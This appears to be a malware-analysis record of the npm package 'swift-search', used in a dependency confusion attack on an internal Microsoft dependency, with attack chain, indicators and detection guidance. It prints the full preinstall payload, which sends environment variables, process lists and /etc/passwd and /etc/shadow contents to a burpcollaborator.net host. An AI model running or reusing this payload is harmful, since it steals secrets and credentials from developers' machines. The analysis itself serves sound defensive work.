package_info.why_malicious: The package was intentionally published to the public npm registry to hijack an internal dependency used by Microsoft (and potentially others) via a dependency confusion attack. Its code exfiltrates sensitive system information to an external server controlled by the researcher, demonstrating clear malicious behavior.

malicious_snippets.code_snippet: export HOSTNAME && BCNET="linux-swift-search-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net"; ping -c 1 $BCNET; curl https://$BCNET --ski -m 10 -d "$(env|base64 -w0)"; curl https://$BCNET --ski -m 10 -d "$( ps aux; cat /proc/version /proc/net/fib_trie /proc/net/if_inet6 /etc/hosts /etc/passwd /etc/shadow 2>&1; ) | base64 -w0" || ping -n 1 windows-swift-search-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net || true
malicious_snippets.code_behavior: On package installation, this code collects sensitive system information (hostname, username, environment variables, process list, system files like /etc/hosts, /etc/passwd, /etc/shadow) and exfiltrates it to an external server via DNS, HTTP(S) POST, and ping requests.

malice_analysis.why_suspicious: The code executes automatically during package installation, collects a wide range of sensitive data, and sends it to an external, attacker-controlled server. This is classic data exfiltration behavior.
malice_analysis.violated_expectations: A preinstall script in a legitimate package should not access or transmit sensitive system files or environment variables, nor should it contact external servers except for legitimate update checks or telemetry (with user consent).
malice_analysis.similar_legitimate_use: Some legitimate packages may use preinstall scripts for environment checks or telemetry, but never to exfiltrate sensitive files like /etc/shadow or /etc/passwd.
key_indicators: Base64 encoding of environment variables and process list
Use of curl to POST data to an external domain
Dynamic construction of exfiltration domain using system/user info
Network requests to burpcollaborator.net (a known testing/exfiltration service)

attack_chain.action: Attacker publishes a malicious package named 'swift-search' to the public npm registry, matching the name of an internal dependency used by Microsoft.
attack_chain.leads_to: Hijacking of dependency resolution in target environments

attack_chain.action: Target environment (e.g., Microsoft Halo game dev server) installs the public 'swift-search' package due to dependency confusion.
Malicious preinstall script executes, collecting sensitive system information and exfiltrating it to the attacker's server.
attack_chain.leads_to: Attacker receives sensitive data from internal systems

behavioral_signatures: Preinstall or install scripts in npm packages making network requests
Access to sensitive files (/etc/passwd, /etc/shadow, /etc/hosts) during install
Base64 encoding of environment variables or process output in install scripts
Dynamic construction of exfiltration domains using system/user info
file_indicators: package.json scripts.preinstall containing curl, ping, or base64 commands
network_indicators: Connections to burpcollaborator.net or similar exfiltration/test domains
Unexpected outbound HTTP(S) requests during npm install
DNS queries with host/user info in subdomains
detection_knowledge.how_to_detect: Monitor npm package installation for execution of preinstall/install scripts that access sensitive files or environment variables and make outbound network requests. Flag packages whose install scripts reference /etc/passwd, /etc/shadow, or use curl/ping to external domains. Use network monitoring to detect DNS or HTTP(S) requests to known exfiltration domains (e.g., burpcollaborator.net) during build or install processes.
